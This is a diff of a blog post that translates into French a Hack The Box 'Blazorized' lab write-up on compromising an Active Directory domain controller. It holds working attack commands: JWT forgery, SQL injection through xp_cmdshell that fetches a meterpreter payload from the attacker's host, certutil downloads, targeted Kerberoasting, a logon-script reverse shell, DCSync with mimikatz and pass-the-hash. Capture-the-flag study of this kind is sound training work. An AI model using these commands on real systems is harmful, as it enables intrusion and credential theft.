@@ -1,7 +1,7 @@
 +++
 title = "HTB: Blazorized"
 date = 2024-11-07T18:46:04-06:00
-draft = true
+draft = false
 toc = true
 images = ['/images/HTB-Blazorized/Blazorized.png']
 tags = ['Hack The Box']
@@ -16,7 +16,7 @@ categories = ['Writeups']
 
 Blazorized présente une variété d'attaques Active Directory. Nous commençons par examiner un serveur web hébergeant une application Blazor WebAssembly avec un accès restreint au contenu. Par le biais d'une énumération, nous trouvons plusieurs fichiers DLL associés à l'application. La décompilation d'un de ces fichiers révèle des informations sensibles, que nous utilisons pour forger un jeton Web JSON (JWT). Cela nous permet d'accéder à un panneau d'administration où nous identifions une vulnérabilité d'injection SQL, ce qui nous donne un accès initial.
 
-En exécutant Bloodhound, nous découvrons que l'utilisateur actuel a le privilège `WriteSPN`, ce qui permet une attaque Kerberoasting ciblée pour un déplacement latéral vers un autre utilisateur. Ce second utilisateur a le droit de modifier le `Script-Path` d'un autre utilisateur, ce qui permet un déplacement latéral supplémentaire. Après une deuxième exécution de Bloodhound, nous découvrons que le dernier utilisateur fait partie d'un groupe disposant du privilège `DCSync` sur le contrôleur de domaine, ce qui nous permet de lancer une attaque DCSync pour obtenir le hachage de l'administrateur.
+En exécutant Bloodhound, nous découvrons que l'utilisateur actuel a le privilège `WriteSPN`, permettant une attaque Kerberoast ciblée pour un déplacement latéral vers un autre utilisateur. Ce second utilisateur a le droit de modifier le `Script-Path` d'un autre utilisateur, droit que nous utilisons pour effectuer un autre déplacement latéral. Après une deuxième exécution de Bloodhound, nous découvrons que le dernier utilisateur fait partie d'un groupe disposant du privilège `DCSync` sur le contrôleur de domaine, ouvrant ainsi la voie à une attaque DCSync pour obtenir le hachage de l'administrateur.
 
 Adresse IP cible - `10.10.11.22`
 
@@ -128,7 +128,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 73.71 seconds
 ```
 
-Le scan nmap nous donne des informations sur la cible:
+Le scan nmap nous donne quelques informations:
 
 * La cible est un contrôleur de domaine (le nom de domaine est `blazorized.htb`).
 * Il y a un serveur web avec une redirection vers `http://blazorized.htb`.
@@ -142,7 +142,7 @@ Avant de vérifier le serveur web, nous procédons à une énumération SMB, mai
 
 ![enum4linux smb enumeration](/images/HTB-Blazorized/enum4linux_smb.png)
 
-À `http://blazorized.htb/` nous trouvons un site web personnel construit avec Blazor Web Assembly.
+À `http://blazorized.htb/` nous trouvons un site web construit avec Blazor Web Assembly.
 
 ![Blazorized website](/images/HTB-Blazorized/Blazorized_website.png)
 
@@ -152,7 +152,7 @@ Lorsque nous sélectionnons les autres sections telles que `Interesting Digital 
 
 ![Blazorized failed data fetching](/images/HTB-Blazorized/failed_fetching.png)
 
-Dans la section `Check for Updates` nous apprenons que seul le super administrateur peut accéder au contenu. Le bouton `Check for Updates`, en cliquant dessus, nous obtenons seulement le message `Failed to Update Blazorized's Content!`.
+Dans la section `Check for Updates` nous apprenons que seul le super administrateur peut accéder au contenu.
 
 ![Blazorized check updates](/images/HTB-Blazorized/check_updates.png)
 
@@ -188,7 +188,7 @@ Dans le fichier, nous trouvons du code qui n'est pas bien formaté, nous utiliso
 
 ![Blazor script beautified](/images/HTB-Blazorized/js_file_beautified.png)
 
-Nous obtenons beaucoup de code JavaScript mais rien de particulier. Continuons avec Burp Suite, nous utiliserons l'extension `Blazor Traffic Processor` pour nous aider dans notre énumération.
+Nous obtenons beaucoup de code JavaScript mais rien de particulier. Continuons avec Burp Suite, nous utilisons l'extension `Blazor Traffic Processor` pour aider notre énumération.
 
 ![BTP extension](/images/HTB-Blazorized/BTP_extension.png)
 
@@ -204,16 +204,16 @@ En allant sur `http://blazorized.htb/_framework/blazor.boot.json`, on retrouve e
 
 ![DLL files list](/images/HTB-Blazorized/DLL_files.png)
 
-Des recherches plus approfondies révèlent qu'il n'est pas rare pour les applications Blazor WebAssembly d'exposer leurs fichiers DLL ; en réalité, cela fait partie du mode de fonctionnement de Blazor WebAssembly.
+Des recherches supplémentaires nous apprennent qu'il n'est pas rare que les applications Blazor WebAssembly exposent leurs fichiers DLL ; en réalité, cela fait partie du fonctionnement de Blazor WebAssembly.
 
-These applications are unique in that they run client-side in the browser through WebAssembly. To execute .NET code in the browser:
+La particularité de ces applications est qu'elles s'exécutent côté client dans le navigateur grâce à WebAssembly. Pour exécuter le code .NET dans le navigateur:
 
-1. The browser must download the DLL files, including application code and dependencies.
-2. The WebAssembly runtime provided by Blazor loads and runs these DLLs on the client.
+1. Le navigateur doit télécharger les fichiers DLL, y compris le code de l'application et les dépendances.
+2. Le moteur d'exécution WebAssembly fourni par Blazor exécute ces DLL sur le client.
 
-However, it is up to the developers of these applications to ensure that no **sensitive data or critical business logic** is included in the client-side DLL files.
+Toutefois, il incombe aux développeurs de ces applications de s'assurer qu'aucune **donnée sensible** n'est incluse dans les fichiers DLL côté client.
 
-Let's download the files and try to find something exploitable, we will use the python script below.
+Nous téléchargeons les fichiers et essayons de trouver quelque chose d'exploitable, nous utiliserons le script python ci-dessous.
 
 ```python
 import os
@@ -252,11 +252,9 @@ if 'resources' in data and 'lazyAssembly' in data['resources']:
 print("Download complete.")
 ```
 
-Let's use [decompiler.com](https://www.decompiler.com/) to decompile our DLL files (you can also use DNSpy on Windows).
+Utilisons [decompiler.com](https://www.decompiler.com/) pour décompiler nos fichiers DLL (vous pouvez aussi utiliser DNSpy sous Windows).
 
-> I went through a TON of decompilations that turned out to be useless so I'm going to skip to the right one.
-
-Decompile `Blazorized.Helpers.dll` and go to `Blazorized.Helpers` --> `JWT.cs`. Here we find everything that is needed to create a Super Admin JWT token. We will use [jwt.io](https://jwt.io/) to generate it.
+Décompilez `Blazorized.Helpers.dll` et allez à `Blazorized.Helpers` --> `JWT.cs`. Nous y trouvons tout ce qui est nécessaire pour créer un JWT (JSON Web Token) Super Admin. Nous utilisons [jwt.io](https://jwt.io/) pour cette tâche.
 
 ![JWT info](/images/HTB-Blazorized/JWT_info.png)
 
@@ -264,15 +262,15 @@ Decompile `Blazorized.Helpers.dll` and go to `Blazorized.Helpers` --> `JWT.cs`. 
 
 ![JWT info3](/images/HTB-Blazorized/JWT_info3.png)
 
-Beloe is all the information we need:
+Vous trouverez ci-dessous toutes les informations dont nous avons besoin:
 
 ```
-# For the Header (make sure to change the algorithm to 512 at the top of the page)
+# Pour le Header (make sure to change the algorithm to 512 at the top of the page)
 
 "alg": 512
 "typ": "JWT"
 
-# For the payload
+# Pour le payload
 
 "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress": "superadmin@blazorized.htb"
 "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Super_Admin"
@@ -280,14 +278,14 @@ Beloe is all the information we need:
 "aud": "http://admin.blazorized.htb"
 "exp": "xxxxxxxxxxx" 
 
-# In the VERIFY SIGNATURE section just paste the value of jwtSymmetricSecurityKey
+# Pour la section VERIFY SIGNATURE, il suffit d'utiliser la valeur de jwtSymmetricSecurityKey
 ```
 
-> Do not use the `exp` value in the screenshot, it won't be valid anymore by the time you read this write up. Instead use [EpochConverter](https://www.epochconverter.com/) to generate a valid value. If the current time exceeds the `exp` timestamp, the token will be rejected as expired. (A good value to use is your current day at 11:59 PM, provided that it is not past that time yet).
+> N'utilisez pas la valeur `exp` dans la capture d'écran, elle ne sera plus valide au moment où vous lirez cet article. Utilisez plutôt [EpochConverter](https://www.epochconverter.com/) pour générer une valeur valide. Si l'heure actuelle dépasse l'horodatage `exp`, le jeton sera rejeté comme étant expiré.
 
 ![JWT value](/images/HTB-Blazorized/jwt_value.png)
 
-Once you have your encoded value go to `http://admin.blazorized.htb/`, open the dev tools with `F12`, go to `Storage` --> `Local Storage` and add your token with
+Une fois que vous avez votre valeur encodée, allez à `http://admin.blazorized.htb/`, ouvrez les outils de développement avec `F12`, puis dans`Storage` --> `Local Storage` et ajoutez votre token avec
 
 ```
 key = jwt
@@ -296,21 +294,21 @@ Value = YOUR_ENCODED_JWT
 
 ![JWT local storage](/images/HTB-Blazorized/jwt_local_storage.png)
 
-After refreshing the page we access the Super Admin Panel.
+Après avoir actualisé la page, nous accédons au tableau de bord du super administrateur.
 
 ![Super Admin Panel](/images/HTB-Blazorized/super_admin-panel.png)
 
 ## Accès initial
 
-In the `Check Duplicate Post Titles` section we find a feature that is most likely using the datbase (MSSQL), we will use this and try to get a reverse shell via SQL injections.
+Dans la section `Check Duplicate Post Titles` nous trouvons une fonctionnalité qui utilise très probablement la base de données (MSSQL), nous nous en servons et essayons d'obtenir un reverse shell via des injections SQL.
 
-1. We start by creating a malicious `exe` file.
+1. Nous commençons par créer un fichier `exe` malveillant.
 
 ```
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=LISTENER_PORT -f exe -o shell.exe
 ```
 
-2. After setting up a web server, we drop the file on the target system.
+2. Après avoir mis en place un serveur web, nous transférons le fichier sur le système cible.
 
 ```
 '; IF (SELECT CONVERT(INT, value_in_use) FROM sys.configurations WHERE name = 'xp_cmdshell') = 1 EXEC master.dbo.xp_cmdshell 'powershell -c "curl http://YOUR_IP:WEBSERVER_PORT/shell.exe -o %TEMP%\shell.exe" --
@@ -318,9 +316,9 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=LISTENER_POR
 
 ![malicious file dropped on target](/images/HTB-Blazorized/revshell1.png)
 
-3. We start a listener in Metasploit via `exploit/multi/handler`.
+3. Nous démarrons un listener dans Metasploit via `exploit/multi/handler`.
 
-4. We execute the malicous `exe` file on the target and obtain a meterpreter shell as `NU_1055`.
+4. Nous exécutons le fichier malicieux `exe` sur la cible et obtenons un shell meterpreter en tant que `NU_1055`.
 
 ```
 '; IF (SELECT CONVERT(INT, value_in_use) FROM sys.configurations WHERE name = 'xp_cmdshell') = 1 EXEC master.dbo.xp_cmdshell ' %TEMP%\shell.exe --
@@ -328,14 +326,13 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=LISTENER_POR
 
 ![Meterpreter shell foothold](/images/HTB-Blazorized/foothold.png)
 
-We find the user flag in the user Desktop.
+Nous trouvons le drapeau utilisateur sur le bureau.
 
 ![user flag](/images/HTB-Blazorized/user_flag.png)
 
 ### Mouvement latéral (Shell en tant que RSA_4810)
 
-Usually we would run Bloodhound with some credentials in order to gather all the data about the domain. When we do not have access to any credentials we can use [SharpHound](https://github.com/BloodHoundAD/SharpHound) to obtain that information.
-
+Habituellement, nous utilisons Bloodhound avec des identifiants afin de rassembler toutes les données relatives au domaine. Lorsque nous n'avons pas accès à des informations d'identification, nous pouvons utiliser [SharpHound](https://github.com/BloodHoundAD/SharpHound) pour effectuer l'énumération du domaine.
 ```
 certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/SharpHound.exe sharphound.exe
 ```
@@ -344,15 +341,15 @@ certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/SharpHound.exe sh
 
 ![SharpHound zip file](/images/HTB-Blazorized/sharhound_zip.png)
 
-We download the `zip` archive on our local machine, extract it, and load the files in Bloodhound.
+Nous téléchargeons l'archive `zip` sur notre machine locale, l'extrayons et téléchargeons les fichiers dans Bloodhound.
 
-Find user `NU_1055`, then go to `Node Info` --> `First Degree Object Control` under `OUTBOUND OBJECT CONTROL`. We discover that the user has the `WriteSPN` right over the user `RSA_4810`.
+Nous trouvons l'utilisateur `NU_1055`, puis nous allons dans `Node Info` --> `First Degree Object Control` sous `OUTBOUND OBJECT CONTROL`. Nous découvrons que l'utilisateur a le droit `WriteSPN` sur l'utilisateur `RSA_4810`.
 
-> SPNs are identifiers used by Kerberos to associate a service with a particular account in Active Directory. When a client requests access to a service (identified by its SPN), it requests a Service Ticket for that service from the Domain Controller. For our Kerberoast attack, we will request a Service Ticket for the specific SPN we will create. Since Service Tickets are encrypted with the NTLM hash of the service account’s password, after obtaining these tickets, we can try to crack the hash offline in order recover the service account password.
+> Les SPN sont des identifiants utilisés par Kerberos pour associer un service à un compte particulier au sein de l'Active Directory. Lorsqu'un client demande l'accès à un service (identifié par son SPN), il demande au contrôleur de domaine un ticket de service pour ce service. Pour notre attaque Kerberoast, nous demanderons un ticket de service pour le SPN spécifique que nous allons créer. Comme les tickets de service sont chiffrés avec le hachage NTLM du mot de passe du compte de service, après avoir obtenu ces tickets, nous pouvons essayer de craquer le hachage hors ligne afin de récupérer le mot de passe du compte de service.
 
 ![WriteSPN abuse](/images/HTB-Blazorized/WriteSPN_Abuse.png)
 
-1. Transfer `PowerView.ps1` to the target.
+1. Transférez `PowerView.ps1` sur la cible.
 
 ```
 certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/PowerView.ps1 powerview.ps1
@@ -360,29 +357,29 @@ certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/PowerView.ps1 pow
 
 ![PowerView file transfer](/images/HTB-Blazorized/powerview_transfer.png)
 
-* Switch to a PowerShell prompt and import the PowerView module with the command below
+* Passez à un prompt PowerShell et importez le module PowerView à l'aide de la commande suivante
 
 ```
 Import-Module ./powerview.ps1
 ```
 
-2. Add an arbitrary SPN to user `RSA_4810` account.
+2. Ajoutez un SPN arbitraire au compte de l'utilisateur `RSA_4810`.
 
 ```
 Set-DomainObject -Identity RSA_4810 -SET @{serviceprincipalname='darryl/kscorpio'}
 ```
 
-3. Request a Kerberos Ticket, receive the password hash of `RSA_4810` and crack it offline.
+3. Sollicitez un ticket Kerberos, recevez le hachage du mot de passe `RSA_4810` et craquez-le.
 
 ```
 Get-DomainSPNTicket -SPN darryl/kscorpio 
 ```
 
-> You will need to do some formatting when you copy the hash because it is full of whitespaces.
+> Vous devez supprimer tous les espaces blancs du hachage afin de l'utiliser.
 
 ![Targeted kerberoast attack](/images/HTB-Blazorized/targeted_kerberoasting.png)
 
-Using hashcat we crack the hash and recover the password `(Ni7856Do9854Ki05Ng0005 #)`.
+Avec hashcat, nous récupérons le mot de passe `(Ni7856Do9854Ki05Ng0005 #)`.
 
 ```
 hashcat -m 13100 -a 0 RSA4810_hash.txt /usr/share/wordlists/rockyou.txt
@@ -390,17 +387,17 @@ hashcat -m 13100 -a 0 RSA4810_hash.txt /usr/share/wordlists/rockyou.txt
 
 ![RSA_4810 password](/images/HTB-Blazorized/RSA_4810_pwd.png)
 
-We can now login as `RSA_4810`.
+Nous nous connectons sous le nom de `RSA_4810`.
 
 ```
 evil-winrm -u RSA_4810 -p "(Ni7856Do9854Ki05Ng0005 #)" -i blazorized.htb
 ```
 
-This account does not seem to have anything interesting file-wise. Besides `Administrator` the only other user present in `C:\Users` is `SSA_6010`, so we probably need to move to this user.
+Ce compte ne semble pas avoir de fichiers intéressants. En plus de `Administrator`, le seul autre utilisateur présent dans `C:\Users` est `SSA_6010`, nous devons probablement changer d'utilisateur.
 
 ### Mouvement latéral (Shell en tant que SSA_6010)
 
-Let's enumerate the ACLs in the domain involving permissions related to the user `RSA_4810`.
+Enumérons les ACLs du domaine impliquant des permissions liées à l'utilisateur `RSA_4810`.
 
 ```
 Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "rsa_4810"}
@@ -408,25 +405,25 @@ Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "rsa
 
 ![ACL script-path information](/images/HTB-Blazorized/write_scriptpath.png)
 
-It turns out that `RSA_4810` has permission to modify the `Script-Path` property for `SSA_6010`. When I try to query the specific `scriptPath` for `SSA_6010` it comes back empty. This probably means that no logon script is currently set for the user.
+Il s'avère que `RSA_4810` a la permission de modifier la propriété `Script-Path` de `SSA_6010`. Lorsque j'essaie de rechercher le `scriptPath` spécifique de `SSA_6010`, le résultat est vide. Cela signifie probablement qu'aucun script de connexion n'est actuellement défini pour l'utilisateur.
 
 ![scriptPath query](/images/HTB-Blazorized/scriptPath_query.png)
 
-The path to those scripts is usually relative to a network share designated for logon scripts such as the `SYSVOL` directory, it looks like we will need to manually find the directory and find which file we can write to. Its standard location is `C:\Windows\SYSVOL`.
+Le chemin vers ces scripts est généralement relatif à un partage de réseau désigné pour les scripts de connexion, comme le répertoire `SYSVOL`, il semble que nous devons manuellement localiser le répertoire et identifier le fichier que nous pouvons modifier. Son emplacement standard est `C:\Windows\SYSVOL`.
 
-In `C:\Windows\SYSVOL\sysvol\blazorized.htb\scripts` we discover that we have Full permissions on the directory `A32FF3AEAA23`.
+Dans `C:\Windows\SYSVOL\sysvol\blazorized.htb\scripts` nous découvrons que nous avons les permissions `Full` sur le répertoire `A32FF3AEAA23`.
 
 ![SYSVOL directory permissions](/images/HTB-Blazorized/SYSVOL_dir_perm.png)
 
-1. We set a logon script for the user `SSA_6010`.
+1. Nous définissons un script de connexion pour l'utilisateur `SSA_6010`.
 
 ```
 Set-ADUser -Identity SSA_6010 -ScriptPath 'A32FF3AEAA23\revshell.bat' 
 ```
 
-2. We write a PowerShell reverse shell to `revshell.bat`, which will be automatically executed when `SSA_6010` logs in.
+2. Nous plaçons un reverse shell PowerShell dans `revshell.bat`, qui sera automatiquement exécuté lorsque `SSA_6010` se connectera.
 
-* Get a PowerShell reverse shell on [revshells.com](https://www.revshells.com/), use the `PowerShell#3 (Base64)`.
+* Nous pouvons obtenir un reverse shell PowerShell (`PowerShell#3 (Base64)`) sur [revshells.com](https://www.revshells.com/).
 
 ```
  echo "powershell -e JAB..." | Out-File -FilePath C:\windows\SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23\revshell.bat -Encoding ASCII 
@@ -434,21 +431,21 @@ Set-ADUser -Identity SSA_6010 -ScriptPath 'A32FF3AEAA23\revshell.bat'
 
 ![Logon script revshell](/images/HTB-Blazorized/logon_script_revshell.png)
 
-On our listener we catch a shell as `SSA_6010`.
-
-## Elévation de Privilèges
+Sur notre listener, nous obtenons un shell sous le nom de `SSA_6010`.
 
 ![SSA_6010 shell](/images/HTB-Blazorized/SSA_6010_shell.png)
 
-We switch to a meterpreter shell, upload SharpHound to the target an run it a second time.
+## Elévation de Privilèges
 
-`SSA_6010` is part of the `Super_Support_Administrators`.
+Nous passons à un shell meterpreter, téléchargeons SharpHound sur la cible et l'exécutons une seconde fois.
+
+`SSA_6010` fait partie du groupe `Super_Support_Administrators`.
 
 ![SSA_6010 group memberships](/images/HTB-Blazorized/SSA_6010_group_membership.png)
 
-The members of this group have the `DCSync` right on the Domain Controller. We can use this right to achieve a DCSync attack and get the administrator password hash.
+Les membres de ce groupe ont le droit `DCSync` sur le contrôleur de domaine. Nous pouvons utiliser ce droit pour réaliser une attaque DCSync et obtenir le hachage du mot de passe de l'administrateur.
 
-> DCSync right is a permission typically granted to Domain Controllers in an AD environment. It is used to replicate directory information, including account credentials, across the domain. When a server has this permission, it can perform directory synchronization operations to keep data consistent between different domain controllers. With this right we can pretend to be a Domain Controller by sending a `DRSGetNCChanges` request to the target Domain Controller and when the Domain Controller responds, it sends sensitive information back to us, including password hashes for the requested accounts.
+> Le droit DCSync est une autorisation généralement accordée aux contrôleurs de domaine dans un environnement AD. Il est utilisé pour répliquer les informations de l'annuaire, y compris les informations d'identification des comptes, à travers le domaine. Lorsqu'un serveur dispose de ce droit, il peut effectuer des opérations de synchronisation d'annuaire pour maintenir la cohérence des données entre différents contrôleurs de domaine. Avec ce droit, nous pouvons prétendre être un contrôleur de domaine en envoyant une requête `DRSGetNCChanges` au contrôleur de domaine cible et quand celui-ci répond, il nous renvoie des informations sensibles, y compris les hachages de mots de passe pour les comptes demandés.
 
 ![DCSync Abuse](/images/HTB-Blazorized/DCSync_abuse.png)
 
@@ -456,7 +453,7 @@ The members of this group have the `DCSync` right on the Domain Controller. We c
 certutil.exe -urlcache -split -f http://YOUR-IP:WEBSERVER_PORT/mimikatz.exe mimikatz.exe
 ```
 
-Execute mimikatz with `.\mimikatz.exe` and to get the admin hash, run the following command.
+Exécutez mimikatz avec `.\mimikatz.exe` et pour obtenir le hachage de l'administrateur, exécutez la commande suivante.
 
 ```
 lsadump::dcsync /domain:blazorized.htb /user:administrator
@@ -464,7 +461,7 @@ lsadump::dcsync /domain:blazorized.htb /user:administrator
 
 ![admin password hash](/images/HTB-Blazorized/admin-hash.png)
 
-Now we login as `Administrator` with the hash, and read the root flag.
+Enfin, nous nous connectons en tant que l'`Administrateur`avec le hash, et lisons le drapeau root.
 
 ```
  evil-winrm -i 10.10.11.22 -u Administrator -H "f55ed1465179ba374ec1cad05b34a5f3" 
@@ -472,7 +469,7 @@ Now we login as `Administrator` with the hash, and read the root flag.
 
 ![Root flag](/images/HTB-Blazorized/root_flag.png)
 
-This was a great box, I learned a lot pawning it. Below are some references that were useful to me. Thank you for reading this article and I hope it was of any help to you.
+Vous trouverez ci-dessous quelques références qui m'ont été utiles. Je vous remercie d'avoir lu cet article et j'espère qu'il vous a été utile.
 
 * [HackTricks - DCSync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
 * [SPN-jacking](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
